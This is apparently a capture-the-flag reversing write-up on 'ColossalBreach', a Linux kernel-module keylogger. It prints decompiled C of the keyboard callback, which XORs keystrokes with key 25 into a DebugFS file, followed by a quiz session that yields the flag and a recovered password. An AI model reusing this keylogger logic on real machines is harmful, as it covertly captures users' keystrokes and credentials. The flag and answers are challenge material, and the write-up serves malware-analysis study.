# ColossalBreach

## Recon

Binary and encrypted file.

```plaintext
┌──(quickemu㉿hacking-kali)-[/workspace/rev_colossalbreach]
└─$ file brainstorm.ko
brainstorm.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=b999225b138b38fce83525d548dbc8280b295756, with debug_info, not stripped
```

## Reversing

```c
int spy_cb(notifier_block* nblock, ulong code, void* _param) {
    size_t __n;
    byte* pbVar1;
    byte* pbVar2;
    ulong uVar3;
    char* __dest;
    long in_GS_OFFSET;
    byte local_24[8] = {0};
    char keybuf[12] = {0};

    keybuf._4_8_ = *(undefined8*)(in_GS_OFFSET + 0x28);
    if (*(int*)((long)_param + 8) == 0) {
    LAB_00100167:
        if (keybuf._4_8_ != *(long*)(in_GS_OFFSET + 0x28)) {
            __stack_chk_fail();
        }
        return 1;
    }
    keycode_to_string(*(int*)((long)_param + 0x14), *(int*)((long)_param + 0xc),
                      (char*)local_24, codes);
    __n = strnlen((char*)local_24, 0xc);
    if (__n < 0xd) {
        if (__n != 0xc) {
            if (__n != 0) {
                pbVar2 = local_24;
                pbVar1 = pbVar2 + __n;
                do {
                    *pbVar2 = *pbVar2 ^ 0x19;
                    pbVar2 = pbVar2 + 1;
                } while (pbVar1 != pbVar2);
                __dest = keys_buf + buf_pos;
                uVar3 = buf_pos + __n;
                if (0x3fff < buf_pos + __n) {
                    __dest = keys_buf;
                    uVar3 = __n;
                }
                strncpy(__dest, (char*)local_24, __n);
                buf_pos = uVar3;
                if (codes != 0) {
                    buf_pos = uVar3 + 1;
                    keys_buf[uVar3] = '\n';
                }
            }
            goto LAB_00100167;
        }
    } else {
        fortify_panic("strnlen");
    }
    fortify_panic("__fortify_strlen");
    halt_baddata();
}
```

Keylogger (kernel module) that uses the DebugFS filesystem. `keys` holds the pressed keys, XOR'ed with key 25.

![[Pasted image 20250916152838.png]]

```plaintext
┌──(quickemu㉿hacking-kali)-[/workspace/rev_colossalbreach]
└─$ nc 94.237.51.10 48153
[Quiz] ColossalBreach
Enter all answers correctly to receive the flag
Q1 (Attempt 1/3): Who is the module's author? 0xEr3n
Q2 (Attempt 1/3): What is the name of the function used to register keyboard events? register_keyboard_notifier
Q3 (Attempt 1/3): What is the name of the function that converts keycodes to strings? keycode_to_string
Q4 (Attempt 1/3): What file does the module create to store logs? Provide the full path /sys/kernel/debug/spyyy/keys
Q5 (Attempt 1/3): What message does the module print when imported? w00tw00t
Q6 (Attempt 1/3): What is the XOR key used to obfuscate the keys? 25
Q7 (Attempt 1/3): What is the password entered for 'adam'? supers3cur3passw0rd
Well done!
HTB{s34l_up_th3_br34ch}
```
